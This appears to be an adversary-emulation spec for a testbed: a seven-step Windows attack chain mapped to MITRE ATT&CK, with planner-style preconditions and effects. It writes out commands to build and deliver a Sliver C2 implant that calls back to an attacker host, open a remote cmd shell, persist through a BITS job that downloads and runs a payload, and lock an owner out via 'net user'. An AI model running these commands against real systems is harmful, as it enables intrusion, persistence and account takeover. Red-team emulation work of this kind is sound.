# Chain 001

**Testbed**: `env0` · **Steps**: 7 · **Tactics touched**: Command and Control, Execution, Discovery, Persistence, Defense Evasion, Impact

## MITRE ATT&CK Coverage

| Tactic | Technique IDs |
|---|---|
| Command and Control | T1071.001 |
| Execution | T1204.002, T1059.003 |
| Discovery | T1082 |
| Persistence | T1197 |
| Defense Evasion | T1197 |
| Impact | T1531 |

## Attack Steps (Overview)

| # | Tactic | Technique | Action | Executor |
|---|---|---|---|---|
| 1 | Command and Control | T1071.001 | Build the executable file of a Sliver implant (for Windows) | Sliver Console |
| 2 | Execution | T1204.002 | Simulate the victim download and execute malicious payload file as Admin (Root) | Human |
| 3 | Command and Control | T1071.001 | Execute a Sliver Implant Payload | Sliver Session Establish |
| 4 | Discovery | T1082 | Environment Variable Retrieval | Sliver Executor |
| 5 | Execution | T1059.003 | Execute Command (cmd.exe) | Sliver Session Derive |
| 6 | Persistence, Defense Evasion | T1197 | Persist, Download, & Execute | Command Prompt Executor |
| 7 | Impact | T1531 | Change User Password - Windows | Command Prompt Executor |

## Attack Steps (Detail)

### Step 1 — Build the executable file of a Sliver implant (for Windows)

- **UUID**: `sliver-payload-windows-exe`
- **Source**: Manual
- **Supported platforms**: windows
- **Tactics**: Command and Control
- **MITRE ID(s)**: T1071.001
- **Technique(s)**: Application Layer Protocol - Web Protocols

**Description**

The command is used in the Sliver C2 (Command and Control) framework to generate a payload designed for remote access to a target machine.

**Execution** (Sliver Console)

```
sliver > generate --mtls #{LHOST}:#{LPORT} --os windows --arch 64bit --format exe --save #{SAVE_PATH}
sliver > mtls --lport #{LPORT}
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `LHOST` | IP address of the attacker machine | — | yes |
| `LPORT` | listening port of the attacter machine | — | yes |
| `SAVE_PATH` | Saved path of the generated payload | — | yes |

**Preconditions**

- `(os-windows ?target - host)`

**Effects**

- `(sliver-implant-payload ?p - payload ?target - host)`
- `(file-payload ?p - payload ?file - file)`
- `(file-on-attacker ?path - string ?file - file)`
- `(standalone-exe-file ?file - file)`
- `(payload-handler-set ?p - payload)`
- `(callback-covered ?file - file)`

---

### Step 2 — Simulate the victim download and execute malicious payload file as Admin (Root)

- **UUID**: `simulate-download-execute-file-root`
- **Source**: Manual
- **Supported platforms**: windows
- **Tactics**: Execution
- **MITRE ID(s)**: T1204.002
- **Technique(s)**: User Execution: Malicious File

**Execution** (Human)

```
(This step needs human interaction and (temporarily) cannot be executed automatically)
(On attacker's machine)
python -m http.server #{LPORT}

(On victim's machine)
1. Open #{LHOST}:#{LPORT} in the browser
2. Navigate to the path of the target payload file
3. Download the payload file
4. Execute the payload file to #{SAVE_PATH} as Admin (Root)
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `LHOST` | IP address of the http file server (typically the attacker machine) | — | yes |
| `LPORT` | port of the http file server | 8000 | yes |
| `SAVE_PATH` | Saved path of the downloaded payload | — | yes |

**Preconditions**

- `(allow-simulate-user-action ?target - host)`
- **or**(`(os-linux ?target - host)`, `(os-windows ?target - host)`, `(os-macos ?target - host)`)
- `(file-on-attacker ?localpath - string ?file - file)`
- **or**(`(standalone-exe-file ?file - file)`, `(elf-file ?file - file)`)
- `(callback-covered ?file - file)`

**Effects**

- `(file-exists ?path - string ?file - file ?target - host)`
- `(file-executed-elevated ?file - file ?target - host)`

---

### Step 3 — Execute a Sliver Implant Payload

- **UUID**: `execute-sliver-payload-file`
- **Source**: Sliver
- **Supported platforms**: windows
- **Tactics**: Command and Control
- **MITRE ID(s)**: T1071.001
- **Technique(s)**: Application Layer Protocol - Web Protocols

**Description**

Executing a Sliver implant payload will establish a Sliver session.

**Execution** (Sliver Session Establish)

```
None
```

**Preconditions**

- `(sliver-implant-payload ?p - payload ?target - host)`
- `(file-payload ?p - payload ?f - file)`
- `(file-executed ?f - file ?target - host)`
- `(payload-handler-set ?p - payload)`

**Effects**

- `(sliver-session ?s - executor ?target - host)`
- **when** `(file-executed-elevated ?f - file ?target - host)` → `(elevated-executor ?s - executor)`

---

### Step 4 — Environment Variable Retrieval

- **UUID**: `sliver-get_env`
- **Source**: Sliver
- **Supported platforms**: windows, linux
- **Tactics**: Discovery
- **MITRE ID(s)**: T1082
- **Technique(s)**: System Information Discovery

**Description**

The `get_env` command retrieves environment variable values.

**Execution** (Sliver Executor)

```
get_env(name=#{name}, session_id=#{executor})
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `executor` | The session ID of the active Sliver connection. | — | yes |
| `name` | Environment variable name to query | — | yes |

**Preconditions**

- **or**(`(os-windows ?target - host)`, `(os-linux ?target - host)`)
- `(sliver-session ?executorID - executor ?target - host)`

**Effects**

- `(system-information-info-known ?target - host)`

---

### Step 5 — Execute Command (cmd.exe)

- **UUID**: `sliver-cmd`
- **Source**: Sliver
- **Supported platforms**: windows
- **Tactics**: Execution
- **MITRE ID(s)**: T1059.003
- **Technique(s)**: Command and Scripting Interpreter: Windows Command Shell


**Description**

The `cmd.exe` command executes a Windows command. It runs the specified command on the remote host and returns the result. This command is useful for performing various system tasks.

**Execution** (Sliver Session Derive)

```
# no-op — derivation only
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `executor_parent` | The session ID of the active Sliver connection. | — | yes |
| `executor_derived` | The derived Windows CMD executor. | — | yes |

**Preconditions**

- `(os-windows ?target - host)`
- `(sliver-session ?executorID - executor ?target - host)`

**Effects**

- `(command-prompt ?s2 - executor ?target - host)`
- **when** `(elevated-executor ?executorID - executor)` → `(elevated-executor ?s2 - executor)`

---

### Step 6 — Persist, Download, & Execute

- **UUID**: `art-t1197-bits-notifycmdline`
- **Source**: Atomic Red Team
- **Supported platforms**: windows
- **Tactics**: Persistence, Defense Evasion
- **MITRE ID(s)**: T1197
- **Technique(s)**: BITS Jobs

**Description**

Abuses BITS `/setnotifycmdline` to trigger a command whenever the
BITS transfer state changes — the transfer is used as a persistence
vehicle (the notify command fires under the BITS service context).
Original ART hardcodes notepad.exe as the notify command; parameterised.
ART auto_generated_guid 62a06ec5-5754-47d2-bcfc-123d8314c6ae.

**Execution** (Command Prompt Executor)

```
bitsadmin.exe /create "#{bits_job_name}"
bitsadmin.exe /addfile "#{bits_job_name}" "#{remote_file}" "#{local_file}"
bitsadmin.exe /setnotifycmdline "#{bits_job_name}" "#{command_path}" NULL
bitsadmin.exe /resume "#{bits_job_name}"
ping -n 5 127.0.0.1 >nul 2>&1
bitsadmin.exe /complete "#{bits_job_name}"
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `executor` | The Command Prompt session ID used to invoke bitsadmin. | — | yes |
| `bits_job_name` | BITS job name. | AtomicBITS | yes |
| `remote_file` | URL of a file for BITS to download (payload delivery vehicle). | https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md | yes |
| `local_file` | Target-side destination for the BITS download. | C:\\Users\\Public\\bits_download.dat | yes |
| `command_path` | Command invoked via `/setnotifycmdline` on BITS state change. | C:\\Users\\Public\\payload.exe | yes |

**Preconditions**

- `(os-windows ?target - host)`
- `(command-prompt ?executorID - executor ?target - host)`

**Effects**

- `(command-execution-at-event ?c - string ?target - host)`

---

### Step 7 — Change User Password - Windows

- **UUID**: `art-t1531-change-password`
- **Source**: Atomic Red Team
- **Supported platforms**: windows
- **Tactics**: Impact
- **MITRE ID(s)**: T1531
- **Technique(s)**: Account Access Removal

**Description**

Creates a target account (if absent) then rotates its password to a
value only the attacker knows — the legitimate owner is locked out.
Classic post-compromise "revoke owner's access" impact pattern. ART
auto_generated_guid 1b99ef28-f83c-4ec5-8a08-1a56263a5bb2.

**Execution** (Command Prompt Executor)

```
net user #{user_account} #{initial_password} /add
net.exe user #{user_account} #{new_password}
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `executor` | The Command Prompt session ID used to invoke net. | — | yes |
| `user_account` | Local user whose password will be rotated (created if absent). | AtomicAdministrator | yes |
| `initial_password` | Initial password if the account has to be created first. | User2ChangePW! | yes |
| `new_password` | New password that replaces the original — attacker-only. | HuHuHUHoHo283283@dJD | yes |

**Preconditions**

- `(os-windows ?target - host)`
- `(command-prompt ?executorID - executor ?target - host)`
- `(elevated-executor ?executorID - executor)`

**Effects**

- `(user-disabled ?target - host)`

---
